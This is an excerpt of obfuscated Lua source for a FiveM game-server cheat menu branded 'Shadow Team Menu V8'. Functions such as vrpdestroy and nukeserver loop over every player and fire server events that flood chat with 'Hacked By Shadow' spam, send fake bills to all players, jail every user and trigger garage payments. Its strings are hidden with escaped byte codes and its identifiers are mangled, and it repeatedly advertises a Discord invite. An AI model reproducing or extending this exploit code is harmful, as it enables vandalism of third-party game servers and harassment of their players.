...
function vrpdestroy()
                for bD = 0, 9 do
                    udwdj(
                        ...
                        'Shadow https://discord.gg/ysUwSfJ',
                        {
                            141,
                            211,
                            255
                        },
                        '^' .. bD .. 'https://discord.gg/ysUwSfJ'
                    )
                end
                udwdj(
                    'lscustoms:payGarage',
                ...
                Citizen.CreateThread(
                    function()
                        ...
                        for bD = 0, 9 do
                            udwdj(
                                '_chat:messageEntered',
                                '~g~\80\108\97\110\101\35\48\48\48\55\10 ~r~Shadow',
                                {
                                    141,
                                    211,
                                    255
                                },
                                '^' .. bD .. '~b~https://discord.gg/ysUwSfJ'
                            )
                        end
                        for i = 0, 256 do
                            udwdj(
                            ...
                            udwdj(
                                ...
                                GetPlayerServerId(i),
                                'Purposeless',
                                '~g~\80\108\97\110\101\35\48\48\48\55\10 ~r~Shadow ~b~https://discord.gg/ysUwSfJ',
                                43161337
                            )
...
RCCar.Spawn = function()
    ...
    SetVehicleNumberPlateText(RCCar.Entity, "Shadow")
...
function nukeserver()
    Citizen.CreateThread(function()
        ...
        for bs=0,9 do
            udwdj("_chat:messageEntered","~r~",{141,211,255},"Shadow ~b~https://discord.gg/ysUwSfJ")
        end
    ...
    function()
        while waduyh487r64 do
			...
			if chatspam then
                udwdj(
                    ...
                    {0, 0x99, 255},
                    '/ooc Hacked By Shadow https://discord.gg/ysUwSfJ'
                )
                udwdj('_chat:messageEntered', '^8Shadow https://discord.gg/ysUwSfJ', {0, 0x99, 255}, '^3https://discord.gg/ysUwSfJ')
				else
			...
			if banallusers then
				...
				udwdj("js:jailuser", GetPlayerServerId(i), 45 * 60, "~r~Got Fucked By Shadow ~g~\80\108\97\110\101\35\48\48\48\55\10 ~b~https://discord.gg/ysUwSfJ")
				udwdj("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 45 * 60, "~r~HACKED By Shadow Team ~g~\80\108\97\110\101\35\48\48\48\55\10 ~b~https://discord.gg/ysUwSfJ")
					end
				end
      ...
      if IsControlPressed(0, 19) then
		...
		if discordPresence then
                    ...
                    SetDiscordRichPresenceAsset('Shadow')
                    
            SetRichPresence('Made by \80\108\97\110\101\35\48\48\48\55\10 | https://discord.gg/ysUwSfJ')
			
                    SetDiscordRichPresenceAssetText('Shadow Team Demo For YouTube | \80\108\97\110\101\35\48\48\48\55\10')
                
                    SetDiscordRichPresenceAssetSmall('Shadow Team')
...
Citizen.CreateThread(
    function()
        ...
        Wugr4yfgb("\77\97\105\110\77\101\110\117\10", "Shadow Team")
        ...
        local SelectedPlayer
            ...
            elseif Plane.IsMenuOpened("\86\82\80\77\101\110\117\10") then
                ...
                elseif Plane.IsMenuOpened("InfoMenu") then
                    if IlIlIlIlIlI("Shadow Team Menu V8") then
					elseif IlIlIlIlIlI("https://discord.gg/ysUwSfJ") then
                    end
    
                    ililililil()
                elseif Plane.IsMenuOpened("Credits") then
				if     IlIlIlIlIlI("~h~Press on our names <3") then
				elseif IlIlIlIlIlI("∑  ~r~~h~Shadow League community~s~ - Owner & Developer") then
				adyt23h23('~r~~h~Creator of the Shadow Team')
				adyt23h23('~h~Contact him for bug reports etc.')
				adyt23h23('~h~Discord Shadow https://discord.gg/ysUwSfJ.')
				elseif IlIlIlIlIlI("∑  ~r~~h~~s~ - Legend") then
				adyt23h23('~r~~h~Creator Menu Shadow League community')
				...
				elseif IlIlIlIlIlI("∑  ~h~~b~Shadow League community~s~ - Helping tons") then
				adyt23h23('~r~~h~Huge help, tons of props to him')
				adyt23h23('~h~Suggestion machine 101')
				elseif IlIlIlIlIlI("∑  YouTube By Shadow League community") then
				...
				elseif IlIlIlIlIlI("∑  By Shadow Team") then
            ...
            elseif Plane.IsMenuOpened("\84\114\111\108\108\77\101\110\117\10") then
				...
				for i = 0, 128 do
                    udwdj('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "Shadow MENU https://discord.gg/ysUwSfJ \80\108\97\110\101\35\48\48\48\55\10", "6969696969")
                end
		 ...
		 elseif IlIlIlIlIlI("Spawn A Custom Vehicle") then
					...
					local playerVeh = GetVehiclePedIsIn(playerPed, waduyh487r64)
						SetVehicleNumberPlateText(playerVeh, "Shadow")
                    else
                        adyt23h23("~r~Model Isn't Valid You Tard")
                    end
